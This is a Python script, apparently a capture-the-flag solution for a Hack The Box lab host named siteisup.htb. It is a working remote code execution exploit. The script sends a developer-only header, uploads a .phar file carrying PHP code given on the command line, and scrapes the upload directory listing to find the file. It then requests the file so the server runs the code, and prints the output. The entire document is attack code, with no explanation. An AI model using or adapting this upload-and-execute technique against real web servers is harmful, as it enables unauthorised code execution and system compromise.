#!/usr/bin/env python3

import re
import requests
import sys

HEADERS = {
    'Host': 'dev.siteisup.htb',
    'Special-Dev': 'only4dev'
}


def main():
    if len(sys.argv) != 2:
        print(f'Usage: python3 {sys.argv[0]} <php-code>')
        exit(1)

    phpcode = sys.argv[1]

    try:
        requests.post(
            'http://10.10.11.177',
            headers=HEADERS,
            data={
                'check': 1
            },
            files={
                'file': (
                    'test.phar',
                    f'http://dev.siteisup.htb\n{phpcode}'.encode()
                )
            },
            timeout=1
        )
    except requests.exceptions.ReadTimeout:
        pass

    r = requests.get(
        'http://10.10.11.177/uploads/',
        headers=HEADERS
    )

    directory = re.findall(r'([0-9a-f]{32})/', r.text)[0]

    r = requests.get(
        f'http://10.10.11.177/uploads/{directory}/test.phar',
        headers=HEADERS
    )

    print('\n'.join(r.text.splitlines()[1:]))


if __name__ == '__main__':
    main()
